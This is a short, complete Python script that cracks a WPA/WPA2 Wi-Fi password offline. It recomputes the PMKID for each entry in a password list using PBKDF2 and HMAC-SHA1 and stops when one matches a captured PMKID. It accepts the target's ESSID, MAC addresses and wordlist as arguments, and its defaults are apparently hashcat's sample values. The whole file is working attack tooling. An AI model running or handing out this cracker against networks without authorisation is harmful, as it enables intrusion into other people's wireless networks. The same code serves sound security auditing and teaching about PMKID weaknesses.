import hashlib, hmac, struct, sys

# Default Values
pmkid="4d4fe7aac3a2cecab195321ceb99a7d0"
essid=b"hashcat-essid" 
mac_ap=b"\xfc\x69\x0c\x15\x82\x64" 
mac_cl=b"\xf4\x74\x7f\x87\xf9\xf4" 
passlist_src="passlist.txt"

# User Supplied Values
if len(sys.argv) > 1: pmkid=sys.argv[1]
if len(sys.argv) > 2: essid=bytes(sys.argv[2], 'utf-8')
if len(sys.argv) > 3: mac_ap = bytes.fromhex("".join(sys.argv[3].replace("-", ":").split(":")))
if len(sys.argv) > 4: mac_cl = bytes.fromhex("".join(sys.argv[4].replace("-", ":").split(":")))
if len(sys.argv) > 5: passlist_src=sys.argv[5]

# Read passlist.txt into a python list
with open(passlist_src, 'r') as f:
  passlist = f.read().splitlines()

def crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist):
    print('\033[95m')
    print("PMKID:                    ", pmkid)
    print("SSID:                     ", essid.decode())
    print("AP MAC Address:           ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_ap))
    print("Client MAC Address:       ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_cl))
    print('\x1b[0m')

    proceed = input("Attempt crack with these settings? (y/n): ")
    if proceed in ["y", ""]: pass 
    else: return
    print('\033[1m' + '\33[33m' + "Attempting to crack password...\n" + '\x1b[0m')

    for password in passlist:
        pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), essid, 4096, 32)
        try_pmkid = hmac.digest(pmk, b"PMK Name"+mac_ap+mac_cl, hashlib.sha1).hex()[0:32]
        if (try_pmkid == pmkid):
            print('\033[92m' + try_pmkid, "- Matches captured PMKID\n")
            print("Password Cracked!\n" + '\x1b[0m')
            print("SSID:             ", essid.decode())
            print("Password:         ", password, "\n")
            return
        print(try_pmkid)

    print('\033[91m' + "\nFailed to crack password. " + 
          "It may help to try a different passwords list. " + '\x1b[0m' + "\n")

crack_pmkid(pmkid, essid, mac_ap, mac_cl, passlist)